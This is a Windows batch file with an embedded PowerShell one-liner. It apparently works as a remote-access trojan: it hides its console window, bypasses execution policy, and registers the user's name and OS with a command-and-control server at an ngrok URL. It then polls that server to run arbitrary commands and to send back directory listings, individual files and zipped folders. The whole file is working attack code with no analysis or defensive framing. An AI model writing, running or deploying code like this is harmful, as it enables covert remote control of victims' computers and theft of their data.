@echo off
:: Hide command window
if "%~1"=="h" goto :hidden
start /min cmd /c "%~f0" h
goto :eof
:hidden

:: Configuration
:: Configuration
set "SERVER=https://thoughtless-derek-nonextinguishable.ngrok-free.dev"
:: In production, this would be the Ngrok URL
:: set "SERVER=https://YOUR_NGROK.ngrok-free.app"

:: Create a unique ID
set "UID=%USERNAME%-%RANDOM%"

:: PowerShell One-Liner for Beaconing with File Operations
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s=$env:SERVER; $uid=$env:UID; $info=@{user=$env:USERNAME; os=(Get-WmiObject Win32_OperatingSystem).Caption}; try { Invoke-RestMethod -Uri \"$s/api/c2/register\" -Method Post -Body (ConvertTo-Json @{uid=$uid; info=$info}) -ContentType 'application/json' -ErrorAction Stop } catch { exit }; while($true) { try { $cmd = (Invoke-RestMethod -Uri \"$s/api/c2/poll\" -Method Post -Body (ConvertTo-Json @{uid=$uid}) -ContentType 'application/json' -ErrorAction Stop).command; if($cmd) { if($cmd -like '__list_files__*') { $path = $cmd -replace '__list_files__ ', ''; if(-not $path) { $path = (Get-Location).Path }; $files = Get-ChildItem -Path $path -ErrorAction SilentlyContinue | Select-Object @{N='name';E={$_.Name}}, @{N='type';E={if($_.PSIsContainer){'dir'}else{'file'}}}, @{N='size';E={$_.Length}}; Invoke-RestMethod -Uri \"$s/api/c2/file_list_response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; files=$files; path=$path}) -ContentType 'application/json' } elseif($cmd -like '__download__*') { $file = $cmd -replace '__download__ ', ''; $bytes = [System.IO.File]::ReadAllBytes($file); $b64 = [Convert]::ToBase64String($bytes); Invoke-RestMethod -Uri \"$s/api/c2/file_download_response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; content=$b64; filename=(Split-Path $file -Leaf)}) -ContentType 'application/json' } elseif($cmd -like '__download_all__*') { $dir = $cmd -replace '__download_all__ ', ''; if(-not $dir) { $dir = (Get-Location).Path }; $zipPath = \"$env:TEMP\\archive.zip\"; if(Test-Path $zipPath) { Remove-Item $zipPath -Force }; Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zipPath); $bytes = [System.IO.File]::ReadAllBytes($zipPath); $b64 = [Convert]::ToBase64String($bytes); Invoke-RestMethod -Uri \"$s/api/c2/file_download_response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; content=$b64; filename='archive.zip'}) -ContentType 'application/json'; Remove-Item $zipPath -Force } else { $out = iex $cmd 2>&1 | Out-String; Invoke-RestMethod -Uri \"$s/api/c2/response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; output=$out}) -ContentType 'application/json' } } } catch {} Start-Sleep -Seconds 2 }"
